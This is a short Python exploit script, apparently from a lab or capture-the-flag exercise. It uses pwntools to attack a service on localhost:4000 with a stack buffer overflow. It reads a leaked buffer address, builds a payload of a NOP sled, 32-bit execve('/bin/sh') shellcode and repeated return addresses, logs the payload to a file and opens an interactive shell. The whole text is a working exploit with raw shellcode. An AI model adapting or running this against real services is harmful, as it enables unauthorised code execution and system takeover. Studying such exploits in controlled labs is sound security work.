#!/usr/bin/env python2.7
from pwn import *
SHELLCODE = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
NOP="\x90"
SLED_LENGTH=200
RETURN_ADDR_DISTANCE=330 #approx per eccesso

conn = remote('localhost',4000)
print ">>>>Waiting for intro<<<<"
print conn.recvuntil('is at \n')
print ">>>>Got intro, now reading buf address<<<<"
buf_addr=conn.recvline()
print ">>>>Got buf address, creating payload...<<<<"
buf_addr=long(buf_addr,16)
sled_addr=buf_addr+SLED_LENGTH/2

padding=(len(SHELLCODE) + SLED_LENGTH +1) % 4

payload= NOP*SLED_LENGTH + NOP * padding + SHELLCODE + "\0"
delta= (RETURN_ADDR_DISTANCE - len(payload)) / 4
payload += p32(sled_addr) * delta +"\n"

payloadfile=open("payloadfile","w")
payloadfile.write("buf addr: " + str(hex(buf_addr)) + "\0\n")
payloadfile.write("payload size: " + str(len(payload)) + "\0\n")
payloadfile.write("shellcode size: " + str(len(SHELLCODE)) + "\0\n")
payloadfile.write(payload)
print ">>>>...done, waiting for prompt...<<<<"
conn.recvuntil("word?\n")
conn.send(payload)
conn.interactive()

